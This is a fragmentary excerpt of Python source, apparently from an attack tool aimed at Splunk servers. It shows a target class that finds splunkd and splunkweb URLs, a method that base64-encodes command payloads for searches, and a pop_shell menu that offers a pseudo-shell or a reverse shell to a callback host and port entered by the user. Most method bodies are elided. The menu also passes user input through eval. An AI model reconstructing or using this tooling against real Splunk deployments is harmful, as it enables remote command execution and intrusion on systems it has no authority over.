...
class SplunkTarget(object):
    def __init__(self,hostaddr,splunkd_port=8089,splunkweb_port=8000):
        ...
        if info.body:
            self.splunkd_url = "{0}://{1}".format(urllib.parse.urlparse(info.url).scheme,urllib.parse.urlparse(info.url).netloc)
        else:
        ...
        if splunkweb_info.body:
            self.splunkweb_url = "{0}://{1}".format(urllib.parse.urlparse(splunkweb_info.url).scheme,urllib.parse.urlparse(splunkweb_info.url).netloc)
        else:
    ...
    def search_payload_cmd(self,payload):
        ...
        encoded = urllib.parse.quote(base64.b64encode(payload))
    ...
    def pop_shell(self):
        ...
        option = eval(input("Please select option 1-3:"))
        if option == 1:
            self.search_exploit_psudoshell()
        elif option ==2:
            rev_host = input("Enter Callback Host:")
            rev_port = input("Enter Callback Port:")
